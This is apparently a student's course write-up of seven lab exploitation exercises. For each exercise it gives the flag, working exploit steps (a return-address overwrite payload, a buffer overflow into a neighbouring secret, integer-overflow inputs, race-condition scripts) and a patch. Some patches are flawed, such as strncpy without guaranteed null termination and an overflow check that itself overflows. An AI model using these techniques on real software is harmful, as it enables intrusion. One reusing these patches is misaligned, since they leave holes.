# Start Here

`Name`: Austin Cook 
`NetID`: ac898

For each problem below, you will,

1. Fill in the the flag
2. List the steps necessary to exploit the binary. *(May be a single line.)*
3. Provide a patch that fixes the exploit. *(Generated using `make diff`.)*
4. An explanation of what the vulnerability was and how the patch fixes it. *(Keep this explanation short and to the point.)*

---

## problem1

### Flag
`flag{366-iNt3G3r5iGNc0nV3r5i0N}`

### Exploit Steps
1. Run `./problem1`
2. When input is requested, enter `1` for 'Withdrawal'
3. Enter `-1000000` as the quantity

### Patch
```diff
--- .originals/problem1.c	2024-02-15 23:55:55.163947400 +0000
+++ problem1.c	2024-02-16 02:02:35.645948100 +0000
@@ -37,10 +37,15 @@
 
 // Handle a large withdraw
 void large_withdraw(struct user_account *u) {
-  unsigned int withdrawal;
+  int withdrawal;
 
   printf("How much would you like to withdraw?\n> ");
-  scanf("%u", &withdrawal);
+  scanf("%d", &withdrawal);
+  if (withdrawal < 0) {
+    printf("You must withdraw a positive amount.\n");
+    return;
+  }
+
   withdrawal += 50;
 
   // Ensure the user has enough money to complete the transaction

```

### Explanation
The vulnerability is in the method `large_withdrawal()`. User input was read in as an `unsigned int`, yet it was converted back to an int when updating the account balance, preserving the user's original value. This allows the user to enter negative numbers, which was unintended and led to an increase in the user's balance. I fixed the issue by instead using a `signed int` and checking input for negative numbers.

---

## problem2

### Flag
`flag{366-bUFF3r0v3RF10w_r3turn}`

### Exploit Steps
1. Run `objdump -d problem2` and note the return address of the `backdoor` method
2. Enter the command `./problem2 $(python2 -c "print 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x80\x92\x04\x08'")`
   - This command contains the return address in hex after the offset. It is in reverse from how it was previously displayed because it is in little endian

### Patch
```diff
--- .originals/problem2.c	2024-02-15 23:55:55.105979100 +0000
+++ problem2.c	2024-02-17 21:34:50.395833100 +0000
@@ -10,7 +10,7 @@
   char out[32];
 
   memset(out, 0, sizeof(out));
-  strcpy(out, input);
+  strncpy(out, input, 32);
 
   // Copy the user's input and print it out.
   printf("user:   %s\n", input);
```

### Explanation
The vulnerability here is a buffer overflow. The buffer `out` has 32 bytes allocated, but the `strcpy` function will copy characters into `out` until a null character is reached. This lets you put in any size string and the whole thing will by copied up to a null character. Because the return address is stored after `out`, if a new return address is given in the input with the right amount of characters before to offset it, the program will return to another address. I fixed the vulnerability by swapping `strcpy` out for `strncpy` which allows setting the maximum number of characters that will be copied.

---

## problem3

### Flag
`flag{366-BufFeR0v3rf10W_C4n4ry}`

### Exploit Steps
1. Run `./problem3 aaaaaaaaaaaaaaaabbbbbbbbbbbbbbbb`

### Patch
```diff
--- .originals/problem3.c	2024-02-15 23:55:55.269206000 +0000
+++ problem3.c	2024-02-16 18:23:57.195871600 +0000
@@ -16,7 +16,7 @@
 
   // Check that the passwords match. We're using my super special comparison function that
   // shifts password characters over by 1... throws off the hackers!
-  strcpy(passwordBuffer, input);
+  strncpy(passwordBuffer, input, 16);
 
   for (size_t i = 0; i < sizeof(passwordBuffer); i++) {
     passwordBuffer[i]++;

```

### Explanation
The problem is that the two buffers `passwordBuffer`, and `secret` are stored next to each other, with `secret` coming second. The function `strcpy` will copy characters until a null character is reached, so if argv[1] is longer than 15 characters (plus null character), it will overflow into the `secret` buffer, effectively letting you set the secret. Because the password in incremented, I use all a's for the password, and all b's for the buffer which is the character after a. I fixed the vulnerability by uning strncpy instead of strcpy. Strncpy lets you specify a maximum number of characters to copy, thus preventing an overflow into `secret`.

---

## problem4

### Flag
`flag{366-iNt3g3r0v3rF10w}`

### Exploit Steps
1. Run `./problem4`
2. Enter `2147483396` for the value
3. Enter `2` for the multiple

### Patch
```diff
--- .originals/problem4.c	2024-02-15 23:55:55.189522600 +0000
+++ problem4.c	2024-02-16 19:23:21.569363900 +0000
@@ -4,6 +4,15 @@
   printf("The flag goes here");
 }
 
+// takes in two positive numbers (previously verified)
+int numsOverflow(int a, int b) {
+  int c = a * b;
+
+  // if two positive numbers multiply to negative,
+  // an overflow occurred
+  return (c < 0);
+}
+
 // Do not change this value.
 static const int reset_key = -504;
 
@@ -31,6 +40,11 @@
     return -1;
   }
 
+  if (numsOverflow(value, factor)) {
+    printf("Invalid input, positive numbers overflow to negative.\n");
+    return -1;
+  }
+
   result = value * factor;
 
   if (result == reset_key) {

```

### Explanation
The vulnerability here is an integer issue with c, where if you multiply two very large numbers together, the total space will exceed the integer maximum and it will wrap around. This is due to interpreting the number in 2's complement, where the leftmost bit is a negative value. Therefore, a very large number wraps around to a negative. I derived my number by multiplying the largest number in C minus half of the absolute value of the reset key and added one because that is a property of 2's complement. With this number, multiplying it by 2 acts like adding the number with itself and wraps it around to 504. I fixed the problem by creating a function check if the multiplication of the two positive numbers leads to a negative. This is one many ways to know if an overflow occurred.

---

## problem5

### Flag
`flag{366-r5C3c0nd170n}`

### Exploit Steps
1. Run `./problem5-exploit.sh`

#### problem5-exploit.sh
```
#! /bin/bash

./problem5 &
CHILD_PID=$!
FILENAME=/tmp/$CHILD_PID
sleep 0.05
touch $FILENAME
```

### Patch
```diff
--- .originals/problem5.c	2024-02-15 23:55:55.138606000 +0000
+++ problem5.c	2024-02-16 23:14:54.696297700 +0000
@@ -14,8 +14,7 @@
   if (access(destinationFile, F_OK) == 0) {
     printf("Hey, you shouldn't have access to my file... What are you trying to pull? Go away!\n");
   } else {
-    // I'm tired. Checking access is hard work... I need some sleep. 0.1 seconds should do it.
-    usleep(100000);
+    // Removing the sleep statement removes the race condition
 
     // Ok, let's open this file and write the flag to it.
     // Haha... just kidding, the user doesn't have access to the file, so this call will fail.

```

### Explanation
The vulnerability is a race condition. If you create the file while the program is in its 0.1 second sleep, the first else branch will have triggered before you create the file and the second else branch will run because the file will have been created by that point. Thus my exploit was to create a shell script that waits 0.05 of a second after running the program before creating the file. I fixed the vulnerability simply by removing the sleep statement in the code. This means that there is a nominal chance of exploiting a race condition because the code that opens the file will open directly after.

---

## problem6

### Flag
`flag{366-1n73g3RUnd3rfl0W}`

### Exploit Steps
1. Run `python3 generate_dictionary.py` to create a dictionary of all possible passwords
2. Run `./problem6 < dict.txt`

#### generate_dictionary.py
```
LETTERS = "abcdefghijklmnopqrstuvwxyz"

def main():
    f = open("dict.txt", "w")
    
    for _ in range(19):
        f.write("a")
    
    for first in LETTERS:
        for second in LETTERS:
            for third in LETTERS:
                f.write(first + second + third)
                
    f.close()

if __name__ == "__main__":
    main()
```

### Patch
```diff
--- .originals/problem6.c	2024-02-15 23:55:55.075110800 +0000
+++ problem6.c	2024-02-17 00:27:09.792922600 +0000
@@ -13,7 +13,7 @@
   memset(password, (char)0, sizeof(password));
 
   char input[4];
-  unsigned int remainingGuesses;
+  int remainingGuesses;
 
   // Generate a random string of 3 lowercase letters
   srand((unsigned int)time(NULL));
```

### Explanation
The vulnerability here is an integer underflow. `remainingGuesses` is an unsigned int which only accounts for positive numbers. However, we continue to decrement and check if `remainingGuesses > 0`. Since it is not signed, this resolves to true, and the user is allotted more guesses. I exploited the problem by creating a dictionary of all possible answers. Because input for `q` is requested after an initial 6 guesses, I include 19 filler `a` characters at the beginning to ensure that guesses start at the first character of each work. I fixed the vulnerability by changing `remainingGuesses` to a signed int so it would account correctly for negative numbers.

---

## problem7

### Flag
flag{366-Rac3c0ndi7i0N_2}

### Exploit Steps
1. Run `./problem7`
2. Enter `2` then `1000` to deposit $1000
3. Enter `3` to run the deposit
4. Enter `1` then `1600` TWICE to create two withdraws of $1600
5. Enter `3` to run the withdraws
6. Enter `5` to exit the loop and see the flag
7. Repeat if you weren't lucky with the race condition

### Patch
```diff
--- .originals/problem7.c	2024-02-15 23:55:55.243939600 +0000
+++ problem7.c	2024-02-17 01:32:52.777920100 +0000
@@ -9,6 +9,8 @@
 
 int accountBalance = 1000;
 
+pthread_mutex_t lock;
+
 void flag() {
   printf("The flag goes here");
 }
@@ -17,9 +19,12 @@
 void *withdraw(void *arg) {
   unsigned short amount = *(unsigned short *)arg;
 
+  pthread_mutex_lock(&lock);
+
   // Ensure the user has enough money to complete this transaction
   if (amount > accountBalance) {
     printf("Insufficient funds for withdrawal of $%hu\n", amount);
+    pthread_mutex_unlock(&lock);
     return NULL;
   }
 
@@ -29,6 +34,7 @@
   for (unsigned short i = 0; i < amount; i++) {
     --accountBalance;
   }
+  pthread_mutex_unlock(&lock);
   return NULL;
 }
 
@@ -36,9 +42,12 @@
 void *deposit(void *arg) {
   unsigned short amount = *(unsigned short *)arg;
 
+  pthread_mutex_lock(&lock);
+
   // Ensure that the deposit won't overflow the balance.
   if ((amount + accountBalance) > MAX_BALANCE) {
     printf("Accounts can at most have $%d. This deposit would put you over that limit!\n", MAX_BALANCE);
+    pthread_mutex_unlock(&lock);
     return NULL;
   }
 
@@ -48,6 +57,7 @@
   for (unsigned short i = 0; i < amount; i++) {
     ++accountBalance;
   }
+  pthread_mutex_unlock(&lock);
   return NULL;
 }
```

### Explanation
The vulnerability here is a TOCTOU (time of check to time of use) race condition. The issue is that we spawn multiple threads around the same time, and each one checks the account balance before making changes. Therefore, a withdrawal of a large amount of money can be started while another one does the same while seeing the value being the same as before. I fixed the issue by creating a mutex at the beginning and end of each deposit and withdrawal. Now, it checks and completes each operation without any other thread being able to interfere.

---
